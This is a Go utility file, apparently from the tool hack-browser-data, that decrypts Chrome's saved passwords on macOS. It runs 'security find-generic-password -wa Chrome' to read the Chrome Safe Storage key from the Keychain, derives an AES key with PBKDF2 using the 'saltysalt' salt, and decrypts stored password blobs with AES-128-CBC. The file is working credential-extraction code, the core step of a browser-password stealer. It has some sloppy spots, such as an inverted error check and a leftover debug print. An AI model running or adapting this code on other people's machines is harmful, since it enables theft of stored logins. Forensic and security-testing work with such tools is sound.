package utils

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"fmt"
	"hack-browser-data/log"
	"os/exec"
	"path/filepath"

	"github.com/forgoer/openssl"
	"golang.org/x/crypto/pbkdf2"
)

const (
	macChromeDir = "/Users/*/Library/Application Support/Google/Chrome/*/"
)

var (
	iv         = []byte{32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}
	command    = []string{"security", "find-generic-password", "-wa", "Chrome"}
	chromeSalt = []byte("saltysalt")
	chromeKey  []byte
	chromePass []byte
)

func GetDBPath(dbName string) string {
	s, err := filepath.Glob(macChromeDir + dbName)
	if err != nil && len(s) == 0 {
		panic(err)
	}
	return s[0]
}

func InitChromeKey() {
	var (
		cmd            *exec.Cmd
		stdout, stderr bytes.Buffer
	)
	cmd = exec.Command(command[0], command[1], command[2], command[3])
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Println(err)
		panic(err)
	}

	if stderr.Len() > 0 {
		panic(stderr.String())
	}
	// replace /n
	temp := stdout.Bytes()
	chromePass = temp[:len(temp)-1]
	chromeKey = pbkdf2.Key(chromePass, chromeSalt, 1003, 16, sha1.New)
}

func DecryptPass(chromePass []byte) []byte {
	l := pbkdf2.Key(chromePass, chromeSalt, 1003, 16, sha1.New)
	return l
}

func Aes128CBCDecrypt(encryptPass []byte) string {
	src, err := openssl.AesCBCDecrypt(encryptPass, chromeKey, iv, openssl.PKCS5_PADDING)
	if err != nil {
		log.Println(err)
	}
	return string(src)
}

func AesDecrypt(ciphertext []byte, key, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	origData := make([]byte, len(ciphertext))
	fmt.Println(blockMode.BlockSize())
	//func (x *cbcDecrypter) CryptBlocks(dst, src []byte) {
	//	if len(src)%x.blockSize != 0 {
	//		panic("crypto/cipher: input not full blocks")
	blockMode.CryptBlocks(origData, ciphertext)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

func ZeroPadding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{0}, padding)
	return append(ciphertext, padtext...)
}

func ZeroUnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	// 去掉最后一个字节 unpadding 次
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func PKCS7Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func PKCS7UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
